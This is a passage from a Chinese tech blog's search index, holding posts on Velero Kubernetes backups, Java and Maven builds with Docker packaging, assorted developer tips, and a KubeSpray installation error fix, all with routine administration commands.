ReadOnly: false config: Type: ConfigMap (a volume populated by a ConfigMap) Name: harping-bison-mariadb Optional: false default-token-t6zvv: Type: Secret (a volume populated by a Secret) SecretName: default-token-t6zvv Optional: false Name: harping-bison-wordpress-76fcf6cddf-bq62k Volumes: wordpress-data: Type: PersistentVolumeClaim (a reference to a PersistentVolumeClaim in the same namespace) ClaimName: harping-bison-wordpress ReadOnly: false default-token-t6zvv: Type: Secret (a volume populated by a Secret) SecretName: default-token-t6zvv Optional: false 进行标记：\n1 2 kubectl -n velero-test annotate pod harping-bison-mariadb-0 backup.velero.io/backup-volumes=data,config kubectl -n velero-test annotate pod harping-bison-wordpress-76fcf6cddf-bq62k backup.velero.io/backup-volumes=wordpress-data 创建备份 备份指定 namespaces\n1 velero backup create test-1 --include-namespaces velero-test 备份全部 namespaces\n1 velero backup create all 备份完成之后，可以在 minio 页面查看到相关数据目录，如下图：\nPV 的数据会备份在 bucket 的 restic 目录，上图没有体现。\n查看备份 1 2 3 4 5 velero backup get NAME STATUS CREATED EXPIRES STORAGE LOCATION SELECTOR all Completed 2019-12-24 16:22:13 +0800 CST 29d default \u0026lt;none\u0026gt; test-1 Completed 2019-12-24 16:19:49 +0800 CST 29d default \u0026lt;none\u0026gt; 处于 Completed 状态，表示备份已经完成。还可以通过 velero backup describe test-1 --details 命令，查看详细的备份数据清单。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 Resource List: apps/v1/ControllerRevision: - velero-test/harping-bison-mariadb-8bb76d5 apps/v1/Deployment: - velero-test/harping-bison-wordpress - velero-test/nginx apps/v1/ReplicaSet: - velero-test/harping-bison-wordpress-76fcf6cddf - velero-test/nginx-7bb7cd8db5 apps/v1/StatefulSet: - velero-test/harping-bison-mariadb v1/ConfigMap: - velero-test/harping-bison-mariadb - velero-test/harping-bison-mariadb-tests v1/Endpoints: - velero-test/harping-bison-mariadb - velero-test/harping-bison-wordpress v1/Namespace: - velero-test v1/PersistentVolume: - pvc-04be4971-5afc-4310-bc78-6f3f206d3f71 - pvc-997763be-956f-4814-81f0-0f9373731694 - pvc-a893e92b-32da-41c3-9059-abe6a043a864 - pvc-dc9124b8-f6f6-4e6c-a31a-b279b802e313 v1/PersistentVolumeClaim: - velero-test/data-deadly-gnat-mariadb-0 - velero-test/data-harping-bison-mariadb-0 - velero-test/data-wordpress-mariadb-0 - velero-test/harping-bison-wordpress v1/Pod: - velero-test/harping-bison-mariadb-0 - velero-test/harping-bison-wordpress-76fcf6cddf-bq62k - velero-test/nginx-7bb7cd8db5-95q6q v1/Secret: - velero-test/default-token-t6zvv - velero-test/harping-bison-mariadb - velero-test/harping-bison-wordpress - velero-test/istio.default v1/Service: - velero-test/harping-bison-mariadb - velero-test/harping-bison-wordpress v1/ServiceAccount: - velero-test/default Persistent Volumes: \u0026lt;none included\u0026gt; Restic Backups: Completed: velero-test/harping-bison-mariadb-0: config, data velero-test/harping-bison-wordpress-76fcf6cddf-bq62k: wordpress-data 4.2 恢复 - 集群 B 恢复备份 1 velero restore create --from-backup test-1 查看恢复 1 2 3 4 velero restore get NAME BACKUP STATUS WARNINGS ERRORS CREATED SELECTOR test-1-20191224162109 test-1 Completed 0 0 2019-12-24 16:21:09 +0800 CST \u0026lt;none\u0026gt; 查看恢复日志、描述 1 2 velero restore logs test-1-20191224162109 velero restore describe test-1-20191224162109 查看恢复的 Pod 1 2 3 4 5 6 kubectl get pod -n velero-test NAME READY STATUS RESTARTS AGE harping-bison-mariadb-0 1/1 Running 0 4m50s harping-bison-wordpress-76fcf6cddf-bq62k 1/1 Running 0 4m50s nginx-7bb7cd8db5-95q6q 1/1 Running 0 4m50s 验证 PV 恢复 1 2 3 4 5 kubectl get svc -n velero-test NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE harping-bison-mariadb ClusterIP 10.233.51.16 \u0026lt;none\u0026gt; 3306/TCP 23m harping-bison-wordpress NodePort 10.233.27.43 \u0026lt;none\u0026gt; 80:31193/TCP,443:31828/TCP 23m 打开 http://{cluster_b_ip}:31193 ，可以看到修改之后的 Wordpress 页面，即验证 PV 数据恢复正常。\n5. 定时备份 Velero 支持 cron 表达式，进行定时备份。\n1 velero schedule create velero-test-daily --schedule=\u0026#34;0 1 * * *\u0026#34; --include-namespaces velero-test 6. 参考 https://velero.io/docs/master/how-velero-works/ https://github.com/vmware-tanzu/velero https://velero.io/docs/v1.1.0/customize-installation/ ","description":"","id":337,"section":"post","tags":["博文","Kubernetes","Velero","备份"],"title":"使用 Velero 备份 Kubernetes 集群","uri":"https://www.chenshaowen.com/blog/backup-kubernetes-cluster-using-velero.html"},{"content":"\n","description":"","id":338,"section":"post","tags":["整理","Kubernetes"],"title":"Kubernetes Cheat Sheet","uri":"https://www.chenshaowen.com/blog/kubernetes-cheat-sheet.html"},{"content":" 主要记录最近遇到的一些开发问题，解决方法。\n1. Azure 镜像代理 在国内的服务器上，拉取某些镜像速度较慢，或根本就无法拉取。Azure 提供了容器仓库的镜像代理服务。\n无法拉取的镜像源 替换之后的镜像源 k8s.gcr.io gcr.azk8s.cn/google_containers docker.io dockerhub.azk8s.cn gcr.io gcr.azk8s.cn quay.io quay.azk8s.cn 2. watch 命令 watch 命令可以周期性地执行指定的命令。\n常用参数：\nn，间隔时间，默认值 2 秒 d，高亮显示变化区域 使用示例：\n每隔 1 秒高亮显示网络链接数的变化情况 1 watch -n 1 -d netstat -ant 每隔 3 秒输出一次系统的平均负载 1 watch -n 3 \u0026#39;cat /proc/loadavg\u0026#39; 每隔 0.5 秒发一次请求 1 watch -n 0.5 \u0026#39;curl http://example.com\u0026#39; 3. VS Code Terminal 字体异常 由于在 OS X 下，VS Code 配置 zsh 后，图标无法显示。需要将 terminal 字体设置为 Source Code Pro for Powerline。而这个字体并不是各个操作系统的内置字体。下面是安装该字体的步骤：\n下载字体：\n1 curl -L \u0026#34;https://github.com/powerline/fonts/raw/master/SourceCodePro/Source%20Code%20Pro%20for%20Powerline.otf\u0026#34; -o \u0026#34;Source Code Pro for Powerline.otf\u0026#34; 安装字体：\nWindows 将字体移动到 C:\\WINDOWS\\Fonts 下。\nLinux 1 2 3 mkdir -p ~/.fonts/PowerlineFonts cp Source\\ Code\\ Pro\\ for\\ Powerline.otf ~/.fonts/PowerlineFonts fc-cache -f -v ~/.fonts/ OS X 1 2 mkdir -p ~/Library/Fonts/PowerlineFonts cp Source\\ Code\\ Pro\\ for\\ Powerline.otf ~/Library/Fonts/PowerlineFonts/ 4. VS Code 远程开发插件 VS Code 推出了官方远程开发插件扩展。工作原理是，将 VS Code 划分为客户端和服务端，客户端主要负责 UI 部分，服务端主要负责完成开发需求。\n下面是架构图：\nRemote Development 套件相关的插件主要有三个：\nRemote SSH 通过 SSH 连接到 Linux 服务器，部分系统版本可能需要调整（升级 glibc、libstdc++ 等）。\nRemote Containers 允许将本地文件夹挂载到指定的 Docker 容器。可以使用本地文件夹中的 Dockerfile 、docker-compose.yml ，也可以直接挂载到已经存在的容器中。\nRemote WSL 连接到已经运行的 Windows Subsystem for Linux 环境。\n上面所有插件远程连接之后的效果是，可以在本地 VS Code 上编辑远程文件目录，同时打开命令行时已经连接上远程终端。\n","description":"","id":339,"section":"post","tags":["博文","Tips","镜像","字体","VSCode"],"title":"开发 Tips（18）","uri":"https://www.chenshaowen.com/blog/developing-tips-18.html"},{"content":" 首先，编译器需要将 .java 文本文件编译为 .class 字节码，然后 JVM 执行 .class 字节码文件。流程并不复杂，本文主要记录一些在编译、运行时的相关过程。\n1. 单个文件源代码 新建文本文件 Hello.java 1 2 3 4 5 public class Hello { public static void main(String[] args) { System.out.println(\u0026#34;Hello, world!\u0026#34;); } } 编译源码 1 javac Hello.java 执行字节码 1 java Hello 2. 多个源码文件 使用命令行指定多个文件 1 javac M.java E.java 使用文本指定多个文件 1 2 3 4 # 查找当前目录下的 Java 源码文件 find -name \u0026#34;*.java\u0026#34; \u0026gt; source.txt # 编译 javac @source.txt 执行时，只需执行包含 main 函数的类即可，例如，java M。\n上面的编译命令会在当前目录下生成 .class 字节码文件，也可以通过 -d 参数指定生成目录。管理这些字节码文件会是一件繁琐、麻烦的事情，而 Jar 包简化了这个过程。\n3. Jar 文件 Jar 文件以 Zip 格式为基础，将多个文件聚合为一个文件。Jar 文件不仅可以用于压缩、发布，还可以用于部署、封装库、组件、插件程序，同时还可以在 JVM 上直接运行。Jar 包提供如下特性：\n安全性。文件内容具有数字化签名 压缩文件、减少网络传输时间 平台扩展。使用 Jar 文件向 Java 平台核心扩展功能 包密封。存储在 Jar 文件中的包可以进行密封，以增强版本一致性和安全性 包版本控制。Jar 文件可以包含版本、开发者相关信息 可移植性。Java 平台核心对 Jar 文件的处理进行了规范 使用 IDE 工具，可以很方便地创建一个 Jar 文件，例如，Myeclipse，可以自行尝试。这里直接使用 jar 命令，生成 Jar 文件。\n3.1 准备 Java 源码 这里以多源码文件为例，在 com/test 目录下创建两个文件：\nA.java\n1 2 3 4 5 6 7 package com.test; public class A { public static void test() { System.out.println(\u0026#34;A:test()\u0026#34;); } } B.java\n1 2 3 4 5 6 7 8 9 package com.test; import com.test.A; public class B { public static void main(String[] argc) { A a = new A(); a.test(); } } 3.2 编译 Java 源码 1 javac com/test/*.java 3.3 打包 Jar 文件 使用 jar 命令打包 Jar 包，与使用 tar 命令类似。\n1 2 3 4 5 jar cvf test.jar com/test/*.class added manifest adding: com/test/A.class(in = 388) (out= 275)(deflated 29%) adding: com/test/B.class(in = 315) (out= 236)(deflated 25%) 参考文档，Compiling the Example Programs\n3.4 执行 Jar 文件 直接执行 Jar 文件，会报错：\n1 2 3 java -jar test.jar no main manifest attribute, in test.jar 这是由于 JVM 找不到程序的执行入口。有两种方法可以指定程序入口：\n在 META-INF/MANIFEST.MF 文件中指定 使用 unzip 命令解压 Jar 文件，可以看到除了 .class 文件，还有一个 META-INF/MANIFEST.MF 文件。在 META-INF/MANIFEST.MF 文件中，新增：\nMain-Class: com.test.B 指向 public static void main(String[] args) 所在类。\n通过命令行指定包含 main 函数的类 1 2 3 java -cp test.jar com.test.B A:test() 4. Maven 如果只有一两个源码文件，上面的打包过程尚可接受。而对于中大型项目，这种原始的方式无法满足构建和管理的需求，需要借助一定的工具。\nMaven 是一个软件项目管理及自动构建工具，可以用于构建和管理各种项目，例如，Java、Ruby、Scala 等。Maven 是 Apache 软件基金会下的项目。\nMaven项目使用项目对象模型（Project Object Model，POM）来配置。项目对象模型存储在名为 pom.xml 的文件中。\n4.1 安装 Maven 这里以在 CentOS 上安装为例：\n1 yum install -y maven 查看版本：\n1 2 3 4 5 6 7 8 mvn -v Apache Maven 3.0.5 (Red Hat 3.0.5-17) Maven home: /usr/share/maven Java version: 1.8.0_232, vendor: Oracle Corporation Java home: /usr/lib/jvm/java-1.8.0-openjdk-1.8.0.232.b09-0.el7_7.x86_64/jre Default locale: en_US, platform encoding: ANSI_X3.4-1968 OS name: \u0026#34;linux\u0026#34;, version: \u0026#34;3.10.0-862.el7.x86_64\u0026#34;, arch: \u0026#34;amd64\u0026#34;, family: \u0026#34;unix\u0026#34; 4.2 创建一个 pom.xml 文件 以上面的 A.class，B.class 为例，新建一个 pom.xml 文件。artifactId 为构建之后生成的文件名。\n在 Maven 项目中，约定主代码放到 src/main/java 目录下，而无需额外配置。这里新建 src/main/java 目录，将 com 目录移入其中。\n新建 pom.xml 文件如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;project xmlns=\u0026#34;http://maven.apache.org/POM/4.0.0\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd\u0026#34;\u0026gt; \u0026lt;modelVersion\u0026gt;4.0.0\u0026lt;/modelVersion\u0026gt; \u0026lt;groupId\u0026gt;com.test\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;test\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;0.0.1-SNAPSHOT\u0026lt;/version\u0026gt; \u0026lt;packaging\u0026gt;jar\u0026lt;/packaging\u0026gt; \u0026lt;name\u0026gt; a maven project\u0026lt;/name\u0026gt; \u0026lt;build\u0026gt; \u0026lt;plugins\u0026gt; \u0026lt;plugin\u0026gt; \u0026lt;groupId\u0026gt;org.apache.maven.plugins\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;maven-jar-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.1.0\u0026lt;/version\u0026gt; \u0026lt;configuration\u0026gt; \u0026lt;archive\u0026gt; \u0026lt;manifest\u0026gt; \u0026lt;!-- give full qualified name of your main class--\u0026gt; \u0026lt;mainClass\u0026gt;com.test.B\u0026lt;/mainClass\u0026gt; \u0026lt;/manifest\u0026gt; \u0026lt;/archive\u0026gt; \u0026lt;/configuration\u0026gt; \u0026lt;/plugin\u0026gt; \u0026lt;/plugins\u0026gt; \u0026lt;/build\u0026gt; \u0026lt;/project\u0026gt; 最终的目录结构为：\n1 2 3 4 5 6 7 8 9 10 11 tree . |-- pom.xml |-- src | `-- main | `-- java | `-- com | `-- test | |-- A.java | `-- B.java 执行命令，编译项目：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 mvn clean package [INFO] Scanning for projects... [INFO] [INFO] ------------------------------------------------------------------------ [INFO] Building a maven project 0.0.1-SNAPSHOT [INFO] ------------------------------------------------------------------------ Downloading: https://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-jar-plugin/3.1.0/maven-jar-plugin-3.1.0.pom Downloaded: https://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-jar-plugin/3.1.0/maven-jar-plugin-3.1.0.pom (7 KB at 5.1 KB/sec) Downloading: https://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-jar-plugin/3.1.0/maven-jar-plugin-3.1.0.jar Downloaded: https://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-jar-plugin/3.1.0/maven-jar-plugin-3.1.0.jar (27 KB at 49.8 KB/sec) [INFO] [INFO] --- maven-clean-plugin:2.4.1:clean (default-clean) @ test --- [INFO] Deleting /root/test-java/target [INFO] [INFO] --- maven-resources-plugin:2.5:resources (default-resources) @ test --- [debug] execute contextualize [WARNING] Using platform encoding (ANSI_X3.4-1968 actually) to copy filtered resources, i.e. build is platform dependent! [INFO] skip non existing resourceDirectory /root/test-java/src/main/resources [INFO] [INFO] --- maven-compiler-plugin:2.3.2:compile (default-compile) @ test --- [WARNING] File encoding has not been set, using platform encoding ANSI_X3.4-1968, i.e. build is platform dependent! [INFO] Compiling 2 source files to /root/test-java/target/classes [INFO] [INFO] --- maven-resources-plugin:2.5:testResources (default-testResources) @ test --- [debug] execute contextualize [WARNING] Using platform encoding (ANSI_X3.4-1968 actually) to copy filtered resources, i.e. build is platform dependent! [INFO] skip non existing resourceDirectory /root/test-java/src/test/resources [INFO] [INFO] --- maven-compiler-plugin:2.3.2:testCompile (default-testCompile) @ test --- [INFO] No sources to compile [INFO] [INFO] --- maven-surefire-plugin:2.10:test (default-test) @ test --- [INFO] No tests to run. [INFO] Surefire report directory: /root/test-java/target/surefire-reports ------------------------------------------------------- T E S T S ------------------------------------------------------- Results : Tests run: 0, Failures: 0, Errors: 0, Skipped: 0 [INFO] [INFO] --- maven-jar-plugin:3.1.0:jar (default-jar) @ test --- Downloading: https://repo.maven.apache.org/maven2/org/codehaus/plexus/plexus-archiver/3.5/plexus-archiver-3.5.jar Downloading: https://repo.maven.apache.org/maven2/org/codehaus/plexus/plexus-io/3.0.0/plexus-io-3.0.0.jar Downloading: https://repo.maven.apache.org/maven2/org/tukaani/xz/1.6/xz-1.6.jar Downloaded: https://repo.maven.apache.org/maven2/org/codehaus/plexus/plexus-archiver/3.5/plexus-archiver-3.5.jar (183 KB at 259.7 KB/sec) Downloaded: https://repo.maven.apache.org/maven2/org/tukaani/xz/1.6/xz-1.6.jar (101 KB at 84.8 KB/sec) Downloaded: https://repo.maven.apache.org/maven2/org/codehaus/plexus/plexus-io/3.0.0/plexus-io-3.0.0.jar (73 KB at 59.8 KB/sec) [INFO] Building jar: /root/test-java/target/test-0.0.1-SNAPSHOT.jar [INFO] ------------------------------------------------------------------------ [INFO] BUILD SUCCESS [INFO] ------------------------------------------------------------------------ [INFO] Total time: 4.352s [INFO] Finished at: Fri Dec 20 16:12:06 CST 2019 [INFO] Final Memory: 16M/249M [INFO] ------------------------------------------------------------------------ 执行构建包：\n1 2 3 java -jar target/test-0.0.1-SNAPSHOT.jar A:test() 这里可以直接 java -jar 执行的原因是，在 pom.xml 中添加了插件 maven-jar-plugin，该插件会在 META-INF/MANIFEST.MF 中添加 Main-Class 信息。\n4.3 将项目打包到镜像 为了能将项目直接部署在容器平台，编译构建之后，我们还需要将生成的文件容器化。这里使用 docker-maven-plugin 插件来实现。在 pom.xml 文件 plugins 标签中新增如下内容：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 \u0026lt;plugin\u0026gt; \u0026lt;groupId\u0026gt;com.spotify\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;docker-maven-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;configuration\u0026gt; \u0026lt;imageName\u0026gt; shaowenchen/maven-hello-word:v1 \u0026lt;/imageName\u0026gt; \u0026lt;registryUrl\u0026gt;\u0026lt;/registryUrl\u0026gt; \u0026lt;workdir\u0026gt;/work\u0026lt;/workdir\u0026gt; \u0026lt;rm\u0026gt;true\u0026lt;/rm\u0026gt; \u0026lt;env\u0026gt; \u0026lt;TZ\u0026gt;Asia/Shanghai\u0026lt;/TZ\u0026gt; \u0026lt;JAVA_OPTS\u0026gt; -XX:+UnlockExperimentalVMOptions \\ -XX:+UseCGroupMemoryLimitForHeap \\ -XX:MaxRAMFraction=2 \\ -XX:CICompilerCount=8 \\ -XX:ActiveProcessorCount=8 \\ -XX:+UseG1GC \\ -XX:+AggressiveOpts \\ -XX:+UseFastAccessorMethods \\ -XX:+UseStringDeduplication \\ -XX:+UseCompressedOops \\ -XX:+OptimizeStringConcat \u0026lt;/JAVA_OPTS\u0026gt; \u0026lt;/env\u0026gt; \u0026lt;baseImage\u0026gt;openjdk:8\u0026lt;/baseImage\u0026gt; \u0026lt;cmd\u0026gt; java ${JAVA_OPTS} -jar ${project.build.finalName}.jar \u0026lt;/cmd\u0026gt; \u0026lt;!--是否推送image--\u0026gt; \u0026lt;pushImage\u0026gt;false\u0026lt;/pushImage\u0026gt; \u0026lt;resources\u0026gt; \u0026lt;resource\u0026gt; \u0026lt;directory\u0026gt;${project.build.directory}\u0026lt;/directory\u0026gt; \u0026lt;include\u0026gt;${project.build.finalName}.jar\u0026lt;/include\u0026gt; \u0026lt;/resource\u0026gt; \u0026lt;/resources\u0026gt; \u0026lt;serverId\u0026gt;docker-hub\u0026lt;/serverId\u0026gt; \u0026lt;/configuration\u0026gt; \u0026lt;executions\u0026gt; \u0026lt;execution\u0026gt; \u0026lt;phase\u0026gt;package\u0026lt;/phase\u0026gt; \u0026lt;goals\u0026gt; \u0026lt;goal\u0026gt;build\u0026lt;/goal\u0026gt; \u0026lt;/goals\u0026gt; \u0026lt;/execution\u0026gt; \u0026lt;/executions\u0026gt; \u0026lt;/plugin\u0026gt; 再次执行编译命令 mvn package ，会看到增加了一些日志。\n[INFO] --- docker-maven-plugin:1.2.1:build (default) @ test --- SLF4J: Failed to load class \u0026#34;org.slf4j.impl.StaticLoggerBinder\u0026#34;. SLF4J: Defaulting to no-operation (NOP) logger implementation SLF4J: See http://www.slf4j.org/codes.html#StaticLoggerBinder for further details. [WARNING] No entry found in settings.xml for serverId=docker-hub, cannot configure authentication for that registry [INFO] Using authentication suppliers: [ConfigFileRegistryAuthSupplier] [INFO] Copying /root/test-java/target/test-0.0.1-SNAPSHOT.jar -\u0026gt; /root/test-java/target/docker/test-0.0.1-SNAPSHOT.jar [INFO] Building image shaowenchen/maven-hello-word:v1 Step 1/6 : FROM openjdk:8 ---\u0026gt; 09df0563bdfc Step 2/6 : ENV JAVA_OPTS -XX:+UnlockExperimentalVMOptions -XX:+UseCGroupMemoryLimitForHeap -XX:MaxRAMFraction=2 -XX:CICompilerCount=8 -XX:ActiveProcessorCount=8 -XX:+UseG1GC -XX:+AggressiveOpts -XX:+UseFastAccessorMethods -XX:+UseStringDeduplication -XX:+UseCompressedOops -XX:+OptimizeStringConcat ---\u0026gt; Running in b6dabde9580c Removing intermediate container b6dabde9580c ---\u0026gt; 0664556506d3 Step 3/6 : ENV TZ Asia/Shanghai ---\u0026gt; Running in 954b264bfb35 Removing intermediate container 954b264bfb35 ---\u0026gt; 334f644fa97e Step 4/6 : WORKDIR /work ---\u0026gt; Running in 44e039f55452 Removing intermediate container 44e039f55452 ---\u0026gt; 3572d77be94c Step 5/6 : ADD test-0.0.1-SNAPSHOT.jar . ---\u0026gt; 904b5885f74a Step 6/6 : CMD java ${JAVA_OPTS} -jar test-0.0.1-SNAPSHOT.jar ---\u0026gt; Running in b3f567a912a5 Removing intermediate container b3f567a912a5 ---\u0026gt; cba070b2300d ProgressMessage{id=null, status=null, stream=null, error=null, progress=null, progressDetail=null} Successfully built cba070b2300d Successfully tagged shaowenchen/maven-hello-word:v1 [INFO] Built shaowenchen/maven-hello-word:v1 [INFO] ------------------------------------------------------------------------ [INFO] BUILD SUCCESS [INFO] ------------------------------------------------------------------------ [INFO] Total time: 4.017s [INFO] Finished at: Fri Dec 20 16:27:48 CST 2019 [INFO] Final Memory: 31M/508M [INFO] ------------------------------------------------------------------------ 上面的日志是在构建镜像，如果打开推送开关，Maven 会将镜像推送到 dockerhub 仓库。\n查看本地构建的镜像：\n1 2 3 docker images|grep hello shaowenchen/maven-hello-word v1 ade23e55f848 About a minute ago 488MB 5. 参考 https://www.ibm.com/developerworks/cn/java/j-jar/index.html https://zh.wikipedia.org/wiki/Apache_Maven ","description":"","id":340,"section":"post","tags":["博文","Tips"],"title":"如何构建一个 Java 工程","uri":"https://www.chenshaowen.com/blog/how-to-compile-a-java-project.html"},{"content":" 主要记录最近遇到的一些开发问题，解决方法。\n1. 重启 Kubernetes 中的 Job 任务 1 kubectl -n {NAMESPACE} get job {JOB_NAME} -o json | jq \u0026#39;del(.spec.selector)\u0026#39; | jq \u0026#39;del(.spec.template.metadata.labels)\u0026#39; | kubectl replace --force -f - 如果提示没有找到 jq 命令，需要先按照 jq ，yum install -y jq。\n2. DNS 的 SPF 记录 在发送邮件时，由于发件人可以任意指定，收件人无法验证发件人是否真实。SPF 就是为了解决伪造发件人问题。\n例如，收件方收到来自主机 IP 10.10.10.10 的邮件，声称发件人为 admin@domain.com。为了验证发件人信息，收件方会去查询 SPF 记录，是否允许 IP 10.10.10.10 的主机发送邮件。如果不允许，则退信或当作垃圾邮件。\n相关原理和配置可以参考文档，SPF 记录：原理、语法及配置方法简介\n。\n3. 在 Docker 中运行 Java 项目问题 JVM 不知道运行在容器中，误将物理资源当做容器的可用资源，Java 10 才解决这个问题，\n其他版本处理办法：\njava5/6/7/8u131-，添加启动参数 -Xmx`cat /sys/fs/cgroup/memory/memory.limit_in_bytes` java8u131+和java9+，添加启动参数 1 -XX:+UnlockExperimentalVMOptions -XX:+UseCGroupMemoryLimitForHeap 参考链接：容器(docker)中运行java需关注的几个小问题\n4. kubebuilder 安装脚本 1 2 3 4 5 6 7 8 9 10 export version=2.3.0 export os=$(go env GOOS) export arch=$(go env GOARCH) curl -L -O \u0026#34;https://github.com/kubernetes-sigs/kubebuilder/releases/download/v${version}/kubebuilder_${version}_${os}_${arch}.tar.gz\u0026#34; tar -zxvf kubebuilder_${version}_${os}_${arch}.tar.gz mv kubebuilder_${version}_${os}_${arch} /usr/local/kubebuilder export PATH=$PATH:/usr/local/kubebuilder/bin ","description":"","id":341,"section":"post","tags":["博文","Tips"],"title":"开发 Tips（17）","uri":"https://www.chenshaowen.com/blog/developing-tips-17.html"},{"content":" 使用 KubeSpray 安装 Kubernetes 时，报错 1 2 3 4 5 6 fatal: [node0]: FAILED! =\u0026gt; { \u0026#34;assertion\u0026#34;: \u0026#34;ip in ansible_all_ipv4_addresses\u0026#34;, \u0026#34;changed\u0026#34;: false, \u0026#34;evaluated_to\u0026#34;: false, \u0026#34;failed\u0026#34;: true } 查看 inventory.ini 配置 1 2 3 4 5 6 7 cat inventory.ini # ## Configure \u0026#39;ip\u0026#39; variable to bind kubernetes services on a # ## different ip than the default iface # ## We should set etcd_member_name for etcd cluster. The node that is not a etcd member do not need to set the value, or can set the empty string value. [all] node0 ansible_host=139.168.12.4 ip=139.168.12.4 ... 查找报错信息来源 kubespray/extra_playbooks/roles/network_plugin/calico/tasks/pre.yml\n1 2 3 4 5 6 7 8 9 --- - name: Calico | Get kubelet hostname shell: \u0026gt;- {{ bin_dir }}/kubectl get node -o custom-columns=\u0026#39;NAME:.metadata.name,INTERNAL-IP:.status.addresses[?(@.type==\u0026#34;InternalIP\u0026#34;)].address\u0026#39; | egrep \u0026#34;{{ ansible_all_ipv4_addresses | join(\u0026#39;$|\u0026#39;) }}$\u0026#34; | cut -d\u0026#34; \u0026#34; -f1 register: calico_kubelet_name delegate_to: \u0026#34;{{ groups[\u0026#39;kube-master\u0026#39;][0] }}\u0026#34; when: - \u0026#34;cloud_provider is defined\u0026#34; 在 Kubernetes 集群上执行 KubeSpray 的检测命令 1 2 3 4 kubectl get node -o custom-columns=\u0026#39;NAME:.metadata.name,INTERNAL-IP:.status.addresses[?(@.type==\u0026#34;InternalIP\u0026#34;)].address\u0026#39; NAME INTERNAL-IP node0 192.168.12.4 ... 可以发现，ansible 会检测 Node 的 IP 是否在 INTERNAL-IP 中。而 INTERNAL-IP 在 Kubelet 配置，如果没有配置，Kubelet 会使用默认网卡的内网 IP 地址。\n查看机器的默认网卡，通常是 eth0 ip route show default via 192.168.12.1 dev eth0 proto dhcp metric 100 10.233.90.0/24 via 192.168.12.5 dev tunl0 proto bird onlink blackhole 10.233.94.0/24 proto bird 10.233.94.1 dev calia2d66a641cc scope link 10.233.94.2 dev calibebb7f7ab3d scope link 10.233.94.3 dev caliae46a1366fa scope link 10.233.94.5 dev calibf915b87dfb scope link 10.233.96.0/24 via 192.168.12.6 dev tunl0 proto bird onlink 172.17.0.0/16 dev docker0 proto kernel scope link src 172.17.0.1 172.18.0.0/16 dev br-b5a4cd7c2364 proto kernel scope link src 172.18.0.1 172.19.0.0/16 dev br-11f14e31b318 proto kernel scope link src 172.19.0.1 172.20.0.0/16 dev br-915052dd5899 proto kernel scope link src 172.20.0.1 172.21.0.0/16 dev br-0598710a1345 proto kernel scope link src 172.21.0.1 192.168.12.0/24 dev eth0 proto kernel scope link src 192.168.12.4 metric 100 查看默认网卡的 IP 地址，这里是 192.168.12.4。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 ip address 1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever 2: eth0: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000 link/ether 52:54:22:46:f4:c0 brd ff:ff:ff:ff:ff:ff inet 192.168.12.4/24 brd 192.168.12.255 scope global noprefixroute dynamic eth0 valid_lft 81107sec preferred_lft 81107sec inet6 fe80::5054:22ff:fe46:f4c0/64 scope link valid_lft forever preferred_lft forever 修改 IP 配置信息 1 2 3 4 5 6 7 cat inventory.ini # ## Configure \u0026#39;ip\u0026#39; variable to bind kubernetes services on a # ## different ip than the default iface # ## We should set etcd_member_name for etcd cluster. The node that is not a etcd member do not need to set the value, or can set the empty string value. [all] node0 ansible_host=192.168.12.4 ip=192.168.12.4 ... 如果是多网卡，也可以通过参数指定 Kubelet 的 Node IP:\ncat /var/lib/kubelet/kubeadm-flags.env KUBELET_KUBEADM_ARGS=\u0026#34;--cgroup-driver=cgroupfs --network-plugin=cni --pod-infra-container-image=gcr.io/google-containers/pause:3.1 --node-ip={NODE_IP}\u0026#34; ","description":"","id":342,"section":"post","tags":["博文","Kubernetes","错误","安装"],"title":"KubeSpray 安装 Kubernetes 报错 ip in ansible_all_ipv4_addresses","uri":"https://www.chenshaowen.com/blog/ip-not-in-ansible-all-ipv4-addresses-while-using-kubespray.html"},{"content":"1. 测试分层 测试的目的是为了验证预期的功能，发现潜在的缺陷。测试增强了交付合格产品的信心，也给敏捷迭代带来了可能。可以说，测试决定了产品的开发进度。\n网络模型有七层的 OSI 、四层的 TCP，而开发模式有 MTV、MVC、MVP、MVVM 等。高内聚、低耦合，划分职责、分模块、分层。然后结构化、标准化，技术逐步走向成熟。\n测试也分为，UI 测试、API 